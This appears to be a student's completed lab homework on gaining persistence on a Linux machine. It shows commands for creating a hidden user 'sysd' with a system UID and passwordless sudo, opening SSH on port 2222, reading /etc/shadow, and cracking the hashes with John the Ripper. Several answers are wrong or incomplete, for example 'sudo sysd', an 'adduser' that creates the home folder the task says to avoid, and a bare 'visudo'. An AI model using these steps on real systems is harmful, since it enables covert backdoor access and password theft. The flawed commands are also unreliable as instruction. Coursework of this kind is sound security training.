## Advanced Bash - Owning the System
Please edit this file by adding the solution commands on the line below the prompt.
Save and submit the completed file for your homework submission.
## Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
Your solution command here

- *sudo adduser sysd*

![creating a secret user](./Images/snap_1.PNG)

Give your secret user a password:
Your solution command here

- *sudo passwd sysd*

![giving a password](./Images/snap_x.PNG)

Give your secret user a system UID < 1000:
Your solution command here

- *sudo usermod -u 160 sysd*

Give your secret user the same GID:
Your solution command here

- *sudo groupmod -g 100 sysd*

![giving a GID](./Images/snap_2.PNG)

Give your secret user full sudo access without the need for a password:
Your solution command here

- *sudo visudo*

![giving a full sudo access](./Images/snap_3.PNG)

Test that sudo access works without your password:
Your bash commands here
- *sudo sysd*
- *sudo cat /etc/shadow*

![giving a without password access](./Images/snap_y.PNG)


### Step 2: Smooth Sailing


Edit the sshd_config file: sudo nano sshd_config
Your bash commands here
- *Port 22*
  *Port 2222*

  ![adding port 222](./Images/snap_4.PNG)


### Step 3: Testing Your Configuration Update

Restart the SSH service:
Your solution command here

- *service ssh restart*

![restarting](./Images/snap_5.PNG)


Exit the root account:
Your solution command here

- *exit*


SSH to the target machine using your sysd account and port 2222:
Your solution command here

- *ssh sysd@192.168.6.105 -p 2222*

![Hacking the target Machine](./Images/snap_6.PNG)


Use sudo to switch to the root user:
Your solution command here

- *sudo su*

![switching to root](./Images/snap_7.PNG)


### Step 4: Crack All the Passwords

SSH back to the system using your sysd account and port 2222:
Your solution command here

- *ssh sysd@192.168.6.105 -p 2222*

![back to the system](./Images/snap_6.PNG)

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
Your solution command here

- *john shadowaf*

![breaking all the passwords](./Images/snap_9.PNG)

